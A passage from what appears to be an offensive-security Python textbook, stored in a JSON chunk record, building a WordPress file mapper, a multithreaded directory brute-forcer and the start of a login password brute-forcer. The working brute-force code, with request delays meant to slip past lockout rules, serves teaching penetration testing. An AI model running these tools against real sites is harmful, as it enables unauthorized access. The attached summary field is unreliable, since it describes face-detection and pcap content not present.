as well as to discover likely approaches via\nsocial engineering. You can, of course, extend this example beyond\nusing it against carved images from pcaps and use it in conjunction\nwith web crawling and parsing techniques described in later\nchapters.\n5\nWEB HACKERY\nThe ability to analyze web applications\nis an absolutely critical skill for any\nattacker or penetration tester. In most\nmodern networks, web applications\npresent the largest attack surface and\ntherefore are also the most common\navenue for gaining access to the web applications\nthemselves.\nYou’ll find a number of excellent web application tools written in\nPython, including w3af and sqlmap. Quite frankly, topics such as\nSQL injection have been beaten to death, and the tooling available is\nmature enough that we don’t need to reinvent the wheel. Instead,\nwe’ll explore the basics of interacting with the web by using Python\nand then build on this knowledge to create reconnaissance and\nbrute-force tooling. By creating a few different tools, you should learn\nthe fundamental skills you need to build any type of web application\nassessment tool that your particular attack scenario calls for.\nIn this chapter, we’ll look at three scenarios for attacking a web\napp. In the first scenario, you know the web framework that the\ntarget uses, and that framework happens to be open source. A web\napp framework contains many files and directories within directories\nwithin directories. We’ll create a map that shows the hierarchy of the\nweb app locally and use that information to locate the real files and\ndirectories on the live target.\nIn the second scenario, you know only the URL for your target, so\nwe’ll resort to brute-forcing the same kind of mapping by using a\nword list to generate a list of filepaths and directory names that may\nbe present on the target. We’ll then attempt to connect to the\nresulting list of possible paths against a live target.\nIn the third scenario, you know the base URL of your target and its\nlogin page. We’ll examine the login page and use a word list to\nbrute-force a login.\nUsing Web Libraries\nWe’ll start by going over the libraries you can use to interact with\nweb services. When performing network-based attacks, you may be\nusing your own machine or a machine inside the network you’re\nattacking. If you are on a compromised machine, you’ll have to make\ndo with what you’ve got, which might be a bare-bones Python 2.x or\nPython 3.x installation. We’ll take a look at what you can do in those\nsituations using the standard library. For the remainder of the\nchapter, however, we’ll assume you’re on your attacker machine\nusing the most up-to-date packages.\nThe urllib2 Library for Python 2.x\nYou’ll see the library used in code written for Python 2.x. It’s\nurllib2\nbundled into the standard library. Much like the library for\nsocket\nwriting network tooling, people use the library when creating\nurllib2\ntools to interact with web services. Let’s take a look at code that\nmakes a very simple GET request to the No Starch Press website:\nimport urllib2\nurl = 'https://www.nostarch.com'\n1\nresponse = urllib2.urlopen(url) # GET\n2\nprint(response.read())\nresponse.close()\nThis is the simplest example of how to make a GET request to a\nwebsite. We pass in a URL to the function 1, which returns a\nurlopen\nfile-like object that allows us to read back the body of what the\nremote web server returns 2. As we’re just fetching the raw page\nfrom the No Starch website, no JavaScript or other client-side\nlanguages will execute.\nIn most cases, however, you’ll want more fine-grained control over\nhow you make these requests, including being able to define specific\nheaders, handle cookies, and create POST requests. The\nurllib2\nlibrary includes a class that gives you this level of control.\nRequest\nThe following example shows you how to create the same GET\nrequest by using the class and by defining a custom\nRequest User-\nHTTP header:\nAgent\nimport urllib2\nurl = \"https://www.nostarch.com\"\n1\nheaders = {'User-Agent': \"Googlebot\"}\n2\nrequest = urllib2.Request(url,headers=headers)\n3\nresponse = urllib2.urlopen(request)\nprint(response.read())\nresponse.close()\nThe construction of a object is slightly different from our\nRequest\nprevious example. To create custom headers, we define a\nheaders\ndictionary 1, which allows us to then set the header keys and values\nwe want to use. In this case, we’ll make our Python script appear to\nbe the Googlebot. We then create our object and pass in the\nRequest\nand the dictionary 2, and then pass the object to\nurl headers Request\nthe function call 3. This returns a normal file-like object that\nurlopen\nwe can use to read in the data from the remote website.\nThe urllib Library for Python 3.x\nIn Python 3.x, the standard library provides the package,\nurllib\nwhich splits the capabilities from the package into the\nurllib2\nand subpackages. It also adds URL-\nurllib.request urllib.error\nparsing capability with the subpackage .\nurllib.parse\nTo make an HTTP request with this package, you can code the\nrequest as a context manager using the statement. The\nwith\nresulting response should contain a byte string. Here’s how to make\na GET request:\n1\nimport urllib.parse\nimport urllib.request\n2\nurl = 'http://boodelyboo.com'\n3\nwith urllib.request.urlopen(url) as response: # GET\n4\ncontent = response.read()\nprint(content)\nHere we import the packages we need 1 and define the target\nURL 2. Then, using the method as a context manager, we\nurlopen\nmake the request 3 and read the response 4.\nTo create a POST request, pass a data dictionary to the request\nobject, encoded as bytes. This data dictionary should have the key-\nvalue pairs that the target web app expects. In this example, the\ninfo\ndictionary contains the credentials ( , ) needed to log in to\nuser passwd\nthe target website:\ninfo = {'user': 'tim', 'passwd': '31337'}\n1\ndata = urllib.parse.urlencode(info).encode() # data is now of\ntype bytes\n2\nreq = urllib.request.Request(url, data)\nwith urllib.request.urlopen(req) as response: # POST\n3\ncontent = response.read()\nprint(content)\nWe encode the data dictionary that contains the login credentials\nto make it a bytes object 1, put it into the POST request 2 that\ntransmits the credentials, and receive the web app response to our\nlogin attempt 3.\nThe requests Library\nEven the official Python documentation recommends using the\nlibrary for a higher-level HTTP client interface. It’s not in the\nrequests\nstandard library, so you have to install it. Here’s how to do so using\n:\npip\npip install requests\nThe library is useful because it can automatically handle\nrequests\ncookies for you, as you’ll see in each example that follows, but\nespecially in the example where we attack a WordPress site in\n“Brute-Forcing HTML Form Authentication” on page 85. To make an\nHTTP request, do the following:\nimport requests\nurl = 'http://boodelyboo.com'\nresponse = requests.get(url) # GET\ndata = {'user': 'tim', 'passwd': '31337'}\n1\nresponse = requests.post(url, data=data) # POST\n2\nprint(response.text) # response.text = string;\nresponse.content = bytestring\nWe create the , the , and a dictionary containing\nurl request data\nthe and keys. Then we post that request 1 and print the\nuser passwd\nattribute (a string) 2. If you would rather work with a byte string,\ntext\nuse the attribute returned from the post. You’ll see an\ncontent\nexample of that in “Brute-Forcing HTML Form Authentication” on\npage 85.\nThe lxml and BeautifulSoup Packages\nOnce you have an HTTP response, either the or\nlxml BeautifulSoup\npackage can help you parse the contents. Over the past few years,\nthese two packages have become more similar; you can use the\nparser with the package, and the\nlxml BeautifulSoup BeautifulSoup\nparser with the package. You’ll see code from other hackers\nlxml\nthat use one or the other. The package provides a slightly faster\nlxml\nparser, while the package has logic to automatically\nBeautifulSoup\ndetect the target HTML page’s encoding. We will use the\nlxml\npackage here. Install either package with :\npip\npip install lxml\npip install beautifulsoup4\nSuppose you have the HTML content from a request stored in a\nvariable named . Using , you could retrieve the content\ncontent lxml\nand parse the links as follows:\n1\nfrom io import BytesIO\nfrom lxml import etree\nimport requests\nurl = 'https://nostarch.com\n2\nr = requests.get(url) # GET\ncontent = r.content # content is of type 'bytes'\nparser = etree.HTMLParser()\n3\ncontent = etree.parse(BytesIO(content), parser=parser) # Parse\ninto tree\n4\nfor link in content.findall('//a'): # find all \"a\" anchor\nelements.\n5\nprint(f\"{link.get('href')} -> {link.text}\")\nWe import the class from the module 1 because we’ll\nBytesIO io\nneed it in order to use a byte string as a file object when we parse\nthe HTTP response. Next, we perform the GET request as usual 2\nand then use the HTML parser to parse the response. The\nlxml\nparser expects a file-like object or a filename. The class\nBytesIO\nenables us to use the returned byte string content as a file-like object\nto pass to the parser 3. We use a simple query to find all the\nlxml a\n(anchor) tags that contain links in the returned content 4 and print\nthe results. Each anchor tag defines a link. Its attribute specifies\nhref\nthe URL of the link.\nNote the use of the f-string 5 that actually does the writing. In\nPython 3.6 and later, you can use f-strings to create strings\ncontaining variable values enclosed inside braces. This allows you to\neasily do things like include the result of a function call\n( ) or a plain value ( ) in your string.\nlink.get('href') link.text\nUsing , you can do the same kind of parsing with\nBeautifulSoup\nthis code. As you can see, the technique is very similar to our last\nexample using :\nlxml\nfrom bs4 import BeautifulSoup as bs\nimport requests\nurl = 'http://bing.com'\nr = requests.get(url)\n1\ntree = bs(r.text, 'html.parser') # Parse into tree\n2\nfor link in tree.find_all('a'): # find all \"a\" anchor\nelements.\n3\nprint(f\"{link.get('href')} -> {link.text}\")\nThe syntax is almost identical. We parse the content into a tree 1,\niterate over the links ( , or anchor, tags) 2, and print the target (\na href\nattribute) and the link text ( ) 3.\nlink.text\nIf you’re working from a compromised machine, you’ll likely avoid\ninstalling these third-party packages to keep from making too much\nnetwork noise, so you’re stuck with whatever you have on hand,\nwhich may be a bare-bones Python 2 or Python 3 installation. That\nmeans you’ll use the standard library ( or ,\nurllib2 urllib\nrespectively).\nIn the examples that follow, we assume you’re on your attacking\nbox, which means you can use the package to contact web\nrequests\nservers and to parse the output you retrieve.\nlxml\nNow that you have the fundamental means to talk to web services\nand websites, let’s create some useful tooling for any web\napplication attack or penetration test.\nMapping Open Source Web App Installations\nContent management systems (CMSs) and blogging platforms such\nas Joomla, WordPress, and Drupal make starting a new blog or\nwebsite simple, and they’re relatively common in a shared hosting\nenvironment or even an enterprise network. All systems have their\nown challenges in terms of installation, configuration, and patch\nmanagement, and these CMS suites are no exception. When an\noverworked sysadmin or a hapless web developer doesn’t follow all\nsecurity and installation procedures, it can be easy pickings for an\nattacker to gain access to the web server.\nBecause we can download any open source web application and\nlocally determine its file and directory structure, we can create a\npurpose-built scanner that can hunt for all files that are reachable on\nthe remote target. This can root out leftover installation files,\ndirectories that should be protected by .htaccess files, and other\ngoodies that can assist an attacker in getting a toehold on the web\nserver.\nThis project also introduces you to using Python objects,\nQueue\nwhich allow us to build a large, thread-safe stack of items and have\nmultiple threads pick items for processing. This will enable our\nscanner to run very rapidly. Also, we can trust that we won’t have\nrace conditions since we’re using a queue, which is thread-safe,\nrather than a list.\nMapping the WordPress Framework\nSuppose you know that your web app target uses the WordPress\nframework. Let’s see what a WordPress installation looks like.\nDownload and unzip a local copy of WordPress. You can get the\nlatest version from https://wordpress.org/download/. Here, we’re\nusing version 5.4 of WordPress. Even though the file’s layout may\ndiffer from the live server you’re targeting, it provides us with a\nreasonable starting place for finding files and directories present in\nmost versions.\nTo get a map of the directories and filenames that come in a\nstandard WordPress distribution, create a new file named\nmapper.py. Let’s write a function called to walk down\ngather_paths\nthe distribution, inserting each full filepath into a queue called\n:\nweb_paths\nimport contextlib\nimport os\nimport queue\nimport requests\nimport sys\nimport threading\nimport time\nFILTERED = [\".jpg\", \".gif\", \".png\", \".css\"]\n1\nTARGET = \"http://boodelyboo.com/wordpress\"\nTHREADS = 10\nanswers = queue.Queue()\n2\nweb_paths = queue.Queue()\ndef gather_paths():\n3\nfor root, _, files in os.walk('.'):\nfor fname in files:\nif os.path.splitext(fname)[1] in FILTERED:\ncontinue\npath = os.path.join(root, fname)\nif path.startswith('.'):\npath = path[1:]\nprint(path)\nweb_paths.put(path)\n@contextlib.contextmanager\n4\ndef chdir(path):\n\"\"\"\nOn enter, change directory to specified path.\nOn exit, change directory back to original.\n\"\"\"\nthis_dir = os.getcwd()\nos.chdir(path)\ntry:\n5\nyield\nfinally:\n6\nos.chdir(this_dir)\nif __name__ == '__main__':\n7\nwith chdir(\"/home/tim/Downloads/wordpress\"):\ngather_paths()\ninput('Press return to continue.')\nWe begin by defining the remote target website 1 and creating a\nlist of file extensions that we aren’t interested in fingerprinting. This\nlist can be different depending on the target application, but in this\ncase we chose to omit images and style sheet files. Instead, we’re\ntargeting HTML or text files, which are more likely to contain\ninformation useful for compromising the server. The variable\nanswers\nis the object where we’ll put the filepaths we’ve located locally.\nQueue\nThe variable 2 is a second object where we’ll store\nweb_paths Queue\nthe files that we’ll attempt to locate on the remote server. Within the\nfunction, we use the function 3 to walk through\ngather_paths os.walk\nall of the files and directories in the local web application directory.\nAs we walk through the files and directories, we build the full paths to\nthe target files and test them against the list stored in to\nFILTERED\nmake sure we are looking for only the file types we want. For each\nvalid file we find locally, we add it to the variable’s .\nweb_paths Queue\nThe context manager 4 needs a bit of explanation. Context\nchdir\nmanagers provide a cool programming pattern, especially if you’re\nforgetful or just have too much to keep track of and want to simplify\nyour life. You’ll find them helpful when you’ve opened something and\nneed to close it, locked something and need to release it, or changed\nsomething and need to reset it. You’re probably familiar with built-in\nfile managers like to open a file or to use a socket.\nopen socket\nGenerally, you create a context manager by creating a class with\nthe and methods. The method returns\n__enter__ __exit__ __enter__\nthe resource that needs to be managed (like a file or socket), and the\nmethod performs the cleanup operations (closing a file, for\n__exit__\nexample).\nHowever, in situations where you don’t need as much control, you\ncan use the to create a simple context\n@contextlib.contextmanager\nmanager that converts a generator function into a context manager.\nThis function enables you to execute code inside a different\nchdir\ndirectory and guarantees that, when you exit, you’ll be returned to\nthe original directory. The generator function initializes the\nchdir\ncontext by saving the original directory and changing into the new\none, yields control back to 5, and then reverts to the\ngather_paths\noriginal directory 6.\nNotice that the function definition contains and\nchdir try finally\nblocks. You’ll often encounter statements, but the\ntry/except\npair is less common. The block always\ntry/finally finally\nexecutes, regardless of any exceptions raised. We need this here\nbecause, no matter whether the directory change succeeds, we want\nthe context to revert to the original directory. A toy example of the\nblock shows what happens for each case:\ntry\ntry:\nsomething_that_might_cause_an_error()\nexcept SomeError as e:\nprint(e) # show the error on the console\ndosomethingelse() # take some alternative action\nelse:\neverything_is_fine() # this executes only if the try\nsucceeded\nfinally:\ncleanup() # this executes no matter what\nReturning to the mapping code, you can see in the block\n__main__\nthat you use the context manager inside a statement 7,\nchdir with\nwhich calls the generator with the name of the directory in which to\nexecute the code. In this example, we pass in the location where we\nunzipped the WordPress ZIP file. This location will be different on\nyour machine; make sure you pass in your own location. Entering\nthe function saves the current directory name and changes the\nchdir\nworking directory to the path specified as the argument to the\nfunction. It then yields control back to the main thread of execution,\nwhich is where the function is run. Once the\ngather_paths\nfunction completes, we exit the context manager, the\ngather_paths\nclause executes, and the working directory is restored to the\nfinally\noriginal location.\nYou can, of course, use manually, but if you forget to\nos.chdir\nundo the change, you’ll find your program executing in an\nunexpected place. By using your new context manager, you\nchdir\nknow that you’re automatically working in the right context and that,\nwhen you return, you’re back to where you were before. You can\nkeep this context manager function in your utilities and use it in your\nother scripts. Spending time writing clean, understandable utility\nfunctions like this pays dividends later, since you will use them over\nand over.\nExecute the program to walk down the WordPress distribution\nhierarchy and see the full paths printed to the console:\n(bhp) tim@kali:~/bhp/bhp$ python mapper.py\n/license.txt\n/wp-settings.php\n/xmlrpc.php\n/wp-login.php\n/wp-blog-header.php\n/wp-config-sample.php\n/wp-mail.php\n/wp-signup.php\n--snip--\n/readme.html\n/wp-includes/class-requests.php\n/wp-includes/media.php\n/wp-includes/wlwmanifest.xml\n/wp-includes/ID3/readme.txt\n--snip--\n/wp-content/plugins/akismet/_inc/form.js\n/wp-content/plugins/akismet/_inc/akismet.js\nPress return to continue.\nNow our variable’s is full of paths for checking.\nweb_paths Queue\nYou can see that we’ve picked up some interesting results: filepaths\npresent in the local WordPress installation that we can test against a\nlive target WordPress app, including .txt, .js, and .xml files. Of\ncourse, you can build additional intelligence into the script to return\nonly files you’re interested in, such as files that contain the word\ninstall.\nTesting the Live Target\nNow that you have the paths to the WordPress files and directories,\nit’s time to do something with them—namely, test your remote target\nto see which of the files found in your local filesystem are actually\ninstalled on the target. These are the files we can attack in a later\nphase, to brute-force a login or investigate for misconfigurations.\nLet’s add the function to the mapper.py file:\ntest_remote\ndef test_remote():\n1\nwhile not web_paths.empty():\n2\npath = web_paths.get()\nurl = f'{TARGET}{path}'\n3\ntime.sleep(2) # your target may have\nthrottling/lockout.\nr = requests.get(url)\nif r.status_code == 200:\n4\nanswers.put(url)\nsys.stdout.write('+')\nelse:\nsys.stdout.write('x')\nsys.stdout.flush()\nThe function is the workhorse of the mapper. It\ntest_remote\noperates in a loop that will keep executing until the\nweb_paths\nvariable’s is empty 1. On each iteration of the loop, we grab a\nQueue\npath from the 2, add it to the target website’s base path, and\nQueue\nthen attempt to retrieve it. If we get a success (indicated by the\nresponse code 200), we put that URL into the queue 4 and\nanswers\nwrite a on the console. Otherwise, we write an on the console\n+ x\nand continue the loop.\nSome web servers lock you out if you bombard them with\nrequests. That’s why we use a of two seconds 3 to wait\ntime.sleep\nbetween each request, which hopefully slows the rate of our\nrequests enough to bypass a lockout rule.\nOnce you know how a target responds, you can remove the lines\nthat write to the console, but when you’re first touching the target,\nwriting those and characters on the console helps you\n+ x\nunderstand what’s going on as you run your test.\nFinally, we write the function as the entry point to the mapper\nrun\napplication:\ndef run():\nmythreads = list()\n1\nfor i in range(THREADS):\nprint(f'Spawning thread {i}')\n2\nt = threading.Thread(target=test_remote)\nmythreads.append(t)\nt.start()\nfor thread in mythreads:\n3\nthread.join()\nThe function orchestrates the mapping process, calling the\nrun\nfunctions just defined. We start 10 threads (defined at the beginning\nof the script) 1 and have each thread run the function 2.\ntest_remote\nWe then wait for all 10 threads to complete (using )\nthread.join\nbefore returning 3.\nNow, we can finish up by adding some more logic to the\n__main__\nblock. Replace the file’s original block with this updated\n__main__\ncode:\nif __name__ == '__main__':\n1\nwith chdir(\"/home/tim/Downloads/wordpress\"):\ngather_paths()\n2\ninput('Press return to continue.')\n3\nrun()\n4\nwith open('myanswers.txt', 'w') as f:\nwhile not answers.empty():\nf.write(f'{answers.get()}\\n')\nprint('done')\nWe use the context manager 1 to navigate to the right\nchdir\ndirectory before we call . We’ve added a pause there in\ngather_paths",
    "question": "How can you use Python and Scapy to carve out image files from HTTP traffic and then use OpenCV to detect faces in those images?",
    "summary": "The text explains how to use Python and Scapy to extract images from HTTP traffic in a pcap file and then use OpenCV to detect faces in those images. It also covers using Python libraries like urllib, requests, lxml, and BeautifulSoup for web application testing and mapping. The example includes code for a pcap analysis script and a face detection script, along with instructions for setting up the environment and running the tools."
  },
  {
    "start": 48,
    "end": 50,
    "text": "case we want to review the console output before continuing 2. At\nthis point, we have gathered the interesting filepaths from our local\ninstallation. Then we run the main mapping task 3 against the\nremote application and write the answers to a file. We’ll likely get a\nbunch of successful requests, and when we print the successful\nURLs to the console, the results may go by so fast that we won’t be\nable to follow. To avoid that, add a block 4 to write the results to a\nfile. Notice the context manager method to open a file. This\nguarantees that the file closes when the block is finished.\nKicking the Tires\nThe authors keep a site around just for testing (boodelyboo.com/),\nand that’s what we’ve targeted in this example. For your own tests,\nyou might create a site to play with, or you can install WordPress into\nyour Kali VM. Note that you can use any open source web\napplication that’s quick to deploy or that you have running already.\nWhen you run mapper.py, you should see output like this:\nSpawning thread 0\nSpawning thread 1\nSpawning thread 2\nSpawning thread 3\nSpawning thread 4\nSpawning thread 5\nSpawning thread 6\nSpawning thread 7\nSpawning thread 8\nSpawning thread 9\n++x+x+++x+x++++++++++++++++++++++++++++++++++++++++++\n+++++++++++++++++++++\nWhen the process is finished, the paths on which you were\nsuccessful are listed in the new file myanswers.txt.\nBrute-Forcing Directories and File Locations\nThe previous example assumed a lot of knowledge about your\ntarget. But when you’re attacking a custom web application or large\ne-commerce system, you often won’t be aware of all the files\naccessible on the web server. Generally, you’ll deploy a spider, such\nas the one included in Burp Suite, to crawl the target website in order\nto discover as much of the web application as possible. But in a lot of\ncases, you’ll want to get ahold of configuration files, leftover\ndevelopment files, debugging scripts, and other security\nbreadcrumbs that can provide sensitive information or expose\nfunctionality that the software developer did not intend. The only way\nto discover this content is to use a brute-forcing tool to hunt down\ncommon filenames and directories.\nWe’ll build a simple tool that will accept word lists from common\nbrute forcers, such as the gobuster project\n(https://github.com/OJ/gobuster/) and SVNDigger\n(https://www.netsparker.com/blog/web-security/svn-digger-better-\nlists-for-forced-browsing/), and attempt to discover directories and\nfiles that are reachable on the target web server. You’ll find many\nword lists available on the internet, and you already have quite a few\nin your Kali distribution (see /usr/share/wordlists). For this example,\nwe’ll use a list from SVNDigger. You can retrieve the files for\nSVNDigger as follows:\ncd ~/Downloads\nwget https://www.netsparker.com/s/research/SVNDigger.zip\nunzip SVNDigger.zip\nWhen you unzip this file, the file all.txt will be in your Downloads\ndirectory.\nAs before, we’ll create a pool of threads to aggressively attempt to\ndiscover content. Let’s start by creating some functionality to create\na out of a word-list file. Open up a new file, name it bruter.py,\nQueue\nand enter the following code:\nimport queue\nimport requests\nimport threading\nimport sys\nAGENT = \"Mozilla/5.0 (X11; Linux x86_64; rv:19.0)\nGecko/20100101 Firefox/19.0\"\nEXTENSIONS = ['.php', '.bak', '.orig', '.inc']\nTARGET = \"http://testphp.vulnweb.com\"\nTHREADS = 50\nWORDLIST = \"/home/tim/Downloads/all.txt\"\n1\ndef get_words(resume=None):\n2\ndef extend_words(word):\nif \".\" in word:\nwords.put(f'/{word}')\nelse:\n3\nwords.put(f'/{word}/')\nfor extension in EXTENSIONS:\nwords.put(f'/{word}{extension}')\nwith open(WORDLIST) as f:\n4\nraw_words = f.read()\nfound_resume = False\nwords = queue.Queue()\nfor word in raw_words.split():\n5\nif resume is not None:\nif found_resume:\nextend_words(word)\nelif word == resume:\nfound_resume = True\nprint(f'Resuming wordlist from: {resume}')\nelse:\nprint(word)\nextend_words(word)\n6\nreturn words\nThe helper function 1, which returns the words queue\nget_words\nwe’ll test on the target, contains some special techniques. We read\nin a word list file 4 and then begin iterating over each line in the file.\nWe then set the variable to the last path that the brute forcer\nresume\ntried 5. This functionality allows us to resume a brute-forcing session\nif our network connectivity is interrupted or the target site goes down.\nWhen we’ve parsed the entire file, we return a full of words to\nQueue\nuse in our actual brute-forcing function 6.\nNote that this function has an inner function called 2.\nextend_words\nAn inner function is a function defined inside another function. We\ncould have written it outside of , but because\nget_words extend_words\nwill always run in the context of the function, we place it\nget_words\ninside in order to keep the namespaces tidy and make the code\neasier to understand.\nThe purpose of this inner function is to apply a list of extensions to\ntest when making requests. In some cases, you want to try not only\nthe /admin extension, for example, but also admin.php, admin.inc,\nand admin.html 3. It can be useful here to brainstorm common\nextensions that developers might use and forget to remove later on,\nlike .orig and .bak, on top of the regular programming language\nextensions. The inner function provides this capability,\nextend_words\nusing these rules: if the word contains a dot ( ), we’ll append it to the\n.\nURL (for example, /test.php); otherwise, we’ll treat it like a directory\nname (such as /admin/ .\nIn either case, we’ll add each of the possible extensions to the\nresult. For example, if we have two words, and , we\ntest.php admin\nwill put the following additional words into our words queue:\n/test.php.bak, /test.php.inc, /test.php.orig, /test.php.php\n/admin/admin.bak, /admin/admin.inc, /admin/admin.orig,\n/admin/admin.php\nNow, let’s write the main brute-forcing function:\ndef dir_bruter(words):\n1\nheaders = {'User-Agent': AGENT}\nwhile not words.empty():\n2\nurl = f'{TARGET}{words.get()}'\ntry:\nr = requests.get(url, headers=headers)\n3\nexcept requests.exceptions.ConnectionError:\nsys.stderr.write('x');sys.stderr.flush()\ncontinue\nif r.status_code == 200:\n4\nprint(f'\\nSuccess ({r.status_code}: {url})')\nelif r.status_code == 404:\n5\nsys.stderr.write('.');sys.stderr.flush()\nelse:\nprint(f'{r.status_code} => {url}')\nif __name__ == '__main__':\n6\nwords = get_words()\nprint('Press return to continue.')\nsys.stdin.readline()\nfor _ in range(THREADS):\nt = threading.Thread(target=dir_bruter, args=\n(words,))\nt.start()\nThe function accepts a object that is populated\ndir_bruter Queue\nwith words we prepared in the function. We defined a\nget_words\nstring at the beginning of the program to use in the HTTP\nUser-Agent\nrequest so that our requests look like the normal ones coming from\nnice people. We add that information into the variable 1. We\nheaders\nthen loop through the queue. For each iteration, we create a\nwords\nURL with which to request on the target application 2 and send the\nrequest to the remote web server.\nThis function prints some output directly to the console and some\noutput to . We will use this technique to present output in a\nstderr\nflexible way. It enables us to display different portions of output,\ndepending on what we want to see.\nIt would be nice to know about any connection errors we get 3;\nprint an to when that happens. Otherwise, if we have a\nx stderr\nsuccess (indicated by a status of 200), print the complete URL to the\nconsole 4. You could also create a queue and put the results there,\nas we did last time. If we get a 404 response, we print a dot ( ) to\n.\nand continue 5. If we get any other response code, we print\nstderr\nthe URL as well, because this could indicate something interesting\non the remote web server. (That is, something besides a “file not\nfound” error.) It’s useful to pay attention to your output because,\ndepending on the configuration of the remote web server, you may\nhave to filter out additional HTTP error codes in order to clean up\nyour results.\nIn the block, we get the list of words to brute-force 6 and\n__main__\nthen spin up a bunch of threads to do the brute-forcing.\nKicking the Tires\nOWASP has a list of vulnerable web applications, both online and\noffline, such as virtual machines and disk images, that you can test\nyour tooling against. In this case, the URL referenced in the source\ncode points to an intentionally buggy web application hosted by\nAcunetix. The cool thing about attacking these applications is that it\nshows you how effective brute forcing can be.\nWe recommend you set the variable to something sane,\nTHREADS\nsuch as 5, and run the script. A value too low will take a long time to\nrun, while a high value can overload the server. In short order, you\nshould start seeing results such as the following ones:\n(bhp) tim@kali:~/bhp/bhp$ python bruter.py\nPress return to continue.\n--snip--\nSuccess (200: http://testphp.vulnweb.com/CVS/)\n...............................................\nSuccess (200: http://testphp.vulnweb.com/admin/).\n.......................................................\nIf you want to see only the successes, since you used\nsys.stderr\nto write the and dot ( ) characters, invoke the script and redirect\nx .\nto /dev/null so that only the files you found are displayed on\nstderr\nthe console:\npython bruter.py 2> /dev/null\nSuccess (200: http://testphp.vulnweb.com/CVS/)\nSuccess (200: http://testphp.vulnweb.com/admin/)\nSuccess (200: http://testphp.vulnweb.com/index.php)\nSuccess (200: http://testphp.vulnweb.com/index.bak)\nSuccess (200: http://testphp.vulnweb.com/search.php)\nSuccess (200: http://testphp.vulnweb.com/login.php)\nSuccess (200: http://testphp.vulnweb.com/images/)\nSuccess (200: http://testphp.vulnweb.com/index.php)\nSuccess (200: http://testphp.vulnweb.com/logout.php)\nSuccess (200: http://testphp.vulnweb.com/categories.php)\nNotice that we’re pulling some interesting results from the remote\nwebsite, some of which may surprise you. For example, you may\nfind backup files or code snippets left behind by an overworked web\ndeveloper. What could be in that index.bak file? With that\ninformation, you can remove files that could provide an easy\ncompromise of your application.\nBrute-Forcing HTML Form Authentication\nThere may come a time in your web hacking career when you need\nto gain access to a target or, if you’re consulting, assess the\npassword strength on an existing web system. It has become\nincreasingly common for web systems to have brute-force protection,\nwhether a captcha, a simple math equation, or a login token that has\nto be submitted with the request. There are a number of brute\nforcers that can do the brute-forcing of a POST request to the login\nscript, but in a lot of cases they are not flexible enough to deal with\ndynamic content or handle simple “are you human?” checks.\nWe’ll create a simple brute forcer that will be useful against\nWordPress, a popular content management system. Modern\nWordPress systems include some basic anti-brute-force techniques,\nbut still lack account lockouts or strong captchas by default.\nIn order to brute-force WordPress, our tool needs to meet two\nrequirements: it must retrieve the hidden token from the login form\nbefore submitting the password attempt, and it must ensure that we\naccept cookies in our HTTP session. The remote application sets\none or more cookies on first contact, and it will expect the cookies\nback on a login attempt. In order to parse out the login form values,\nwe’ll use the package introduced in “The lxml and\nlxml\nBeautifulSoup Packages” on page 74.\nLet’s get started by having a look at the WordPress login form. You\ncan find this by browsing to http://<yourtarget>/wp-login.php/. You\ncan use your browser’s tools to “view source” to find the HTML\nstructure. For example, using the Firefox browser, choose\nTools▶Web Developer▶Inspector. For the sake of brevity, we’ve\nincluded the relevant form elements only:\n<form name=\"loginform\" id=\"loginform\"\n1\naction=\"http://boodelyboo.com/wordpress/wp-login.php\"\nmethod=\"post\">\n<p>\n<label for=\"user_login\">Username or Email Address</label>\n2\n<input type=\"text\" name=\"log\" id=\"user_login\" value=\"\"\nsize=\"20\"/>\n</p>\n<div class=\"user-pass-wrap\">\n<label for=\"user_pass\">Password</label>\n<div class=\"wp-pwd\">\n3\n<input type=\"password\" name=\"pwd\" id=\"user_pass\"\nvalue=\"\" size=\"20\" />\n</div>\n</div>\n<p class=\"submit\">\n4\n<input type=\"submit\" name=\"wp-submit\" id=\"wp-submit\"\nvalue=\"Log In\" />\n5\n<input type=\"hidden\" name=\"testcookie\" value=\"1\" />\n</p>\n</form>\nReading through this form, we are privy to some valuable\ninformation that we’ll need to incorporate into our brute forcer. The\nfirst is that the form gets submitted to the /wp-login.php path as an\nHTTP POST 1. The next elements are all of the fields required in\norder for the form submission to be successful: 2 is the variable\nlog\nrepresenting the username, 3 is the variable for the password,\npwd\n4 is the variable for the submit button, and 5 is\nwp-submit testcookie\nthe variable for a test cookie. Note that this input is hidden on the\nform.\nThe server also sets a couple of cookies when you make contact\nwith the form, and it expects to receive them again when you post\nthe form data. This is the essential piece of the WordPress anti-\nbrute-forcing technique. The site checks the cookie against your\ncurrent user session, so even if you are passing the correct\ncredentials into the login processing script, the authentication will fail\nif the cookie is not present. When a normal user logs in, the browser\nautomatically includes the cookie. We must duplicate that behavior in\nthe brute-forcing program. We will handle the cookies automatically\nusing the library’s object.\nrequests Session\nWe’ll rely on the following request flow in our brute forcer in order\nto be successful against WordPress:\nRetrieve the login page and accept all cookies that are returned.\nParse out all of the form elements from the HTML.\nSet the username and/or password to a guess from our dictionary.\nSend an HTTP POST to the login processing script, including all\nHTML form fields and our stored cookies.\nTest to see if we have successfully logged in to the web application.\nCain & Abel, a Windows-only password recovery tool, includes a\nlarge word list for brute-forcing passwords called cain.txt. Let’s use\nthat file for our password guesses. You can download it directly from\nDaniel Miessler’s GitHub repository SecLists:\nwget\nhttps://raw.githubusercontent.com/danielmiessler/SecLists/mas\nter/Passwords/Software/cain-and-abel.txt\nBy the way, SecLists contains a lot of other word lists, too. We\nencourage you to browse through the repo for your future hacking\nprojects.\nYou can see that we are going to be using some new and valuable\ntechniques in this script. We will also mention that you should never\ntest your tooling on a live target; always set up an installation of your\ntarget web application with known credentials and verify that you get\nthe desired results. Let’s open a new Python file named\nwordpress_killer.py and enter the following code:\nfrom io import BytesIO\nfrom lxml import etree\nfrom queue import Queue\nimport requests\nimport sys\nimport threading\nimport time\n1\nSUCCESS = 'Welcome to WordPress!'\n2\nTARGET = \"http://boodelyboo.com/wordpress/wp-login.php\"\nWORDLIST = '/home/tim/bhp/bhp/cain.txt'\n3\ndef get_words():\nwith open(WORDLIST) as f:\nraw_words = f.read()\nwords = Queue()\nfor word in raw_words.split():\nwords.put(word)\nreturn words\n4\ndef get_params(content):\nparams = dict()\nparser = etree.HTMLParser()\ntree = etree.parse(BytesIO(content), parser=parser)\n5\nfor elem in tree.findall('//input'): # find all input\nelements\nname = elem.get('name')\nif name is not None:\nparams[name] = elem.get('value', None)\nreturn params\nThese general settings deserve a bit of explanation. The\nTARGET\nvariable 2 is the URL from which the script will first download and\nparse the HTML. The variable 1 is a string that we’ll check\nSUCCESS\nfor in the response content after each brute-forcing attempt in order\nto determine whether or not we are successful.\nThe function 3 should look familiar because we used a\nget_words\nsimilar form of it for the 